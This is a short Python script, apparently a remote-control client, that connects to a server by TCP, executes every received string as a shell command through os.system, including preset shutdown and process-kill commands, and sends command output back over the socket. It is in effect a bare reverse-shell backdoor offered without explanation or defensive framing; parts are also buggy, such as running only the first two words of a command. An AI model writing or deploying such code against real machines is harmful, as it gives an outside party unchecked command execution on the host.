import socket
import threading
import os
import subprocess

is_command_output = False
send_command='ls -l'


def switch_case(value):
    global is_command_output
    global send_command
    if value == 'CLEAR':
        os.system('clear')
    elif value == 'LS':
        os.system('ls')
    elif value == 'IFCONFIG':
        os.system('ip addr')
    elif value == 'SHUTDOWN':
        os.system('shutdown -s')
    elif value == 'PS-LIST':
        is_command_output = True
        os.system('ps -A')
        return
    elif value == 'EPYTHON':
        os.kill(2906, 10)
    else:
        is_command_output=True
        send_command=value
        os.system(value)

def receive_messages(s):
    global is_command_output
    global send_command
    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            commandd = data.decode()
            switch_case(commandd)
                                
        except Exception as e:
            print(f"Error receiving message: {e}")
            break

def start_client(host='127.0.0.1', port=65432):
    global is_command_output
    is_command_output = False
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        print(f'Connected to {host}:{port}')
        threading.Thread(target=receive_messages, args=(s,)).start()
        while True:
             
            if is_command_output:
                print(is_command_output)
                command = send_command.split(' ')
                result = subprocess.run([command[0], command[1]], capture_output=True, text=True)
                s.sendall(result.stdout.encode())
                is_command_output = False

if __name__ == "__main__":
    start_client()
